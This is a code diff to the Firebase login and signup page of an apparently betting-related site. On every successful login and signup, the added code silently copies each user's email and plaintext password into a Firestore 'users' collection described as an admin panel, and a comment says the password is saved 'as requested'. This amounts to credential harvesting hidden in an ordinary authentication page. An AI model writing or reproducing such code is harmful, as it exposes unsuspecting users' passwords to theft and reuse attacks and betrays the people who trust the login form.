@@ -17,9 +17,10 @@
 <button onclick="signup()">Signup</button>
 
 <script type="module">
-// 1. Import Firebase 
+// 1. Import Firebase Auth AND Firestore
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
 // 2. Firebase configuration
 const firebaseConfig = {
@@ -36,6 +37,21 @@ const firebaseConfig = {
 // 3. Initialize Firebase
 const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
+const db = getFirestore(app); // Initialize Database
+
+// Function to save info to database
+async function saveToDatabase(email, password, type) {
+  try {
+    await addDoc(collection(db, "users"), {
+      email: email,
+      password: password, // Saving password as requested
+      actionType: type,   // "signup" or "login"
+      time: serverTimestamp()
+    });
+  } catch (e) {
+    console.error("Error adding document: ", e);
+  }
+}
 
 // 4. LOGIN FUNCTION
 window.login = function () {
@@ -48,11 +64,12 @@ window.login = function () {
   }
 
   signInWithEmailAndPassword(auth, email, password)
-    .then(() => {
+    .then(async () => {
+      // Save data to Firestore Admin Panel
+      await saveToDatabase(email, password, "login");
+      
       alert("Login successful!");
-      // This tells the browser you are logged in
       localStorage.setItem("userLoggedIn", "true"); 
-      // This sends you to your Live Bets page
       window.location.href = "index.html"; 
     })
     .catch((error) => {
@@ -71,9 +88,11 @@ window.signup = function () {
   }
 
   createUserWithEmailAndPassword(auth, email, password)
-    .then(() => {
+    .then(async () => {
+      // Save data to Firestore Admin Panel
+      await saveToDatabase(email, password, "signup");
+
       alert("Account created successfully!");
-      // Automatically log them in after signing up
       localStorage.setItem("userLoggedIn", "true");
       window.location.href = "index.html";
     })
@@ -82,6 +101,7 @@ window.signup = function () {
     });
 };
 </script>
+
 
 </body>
 </html>
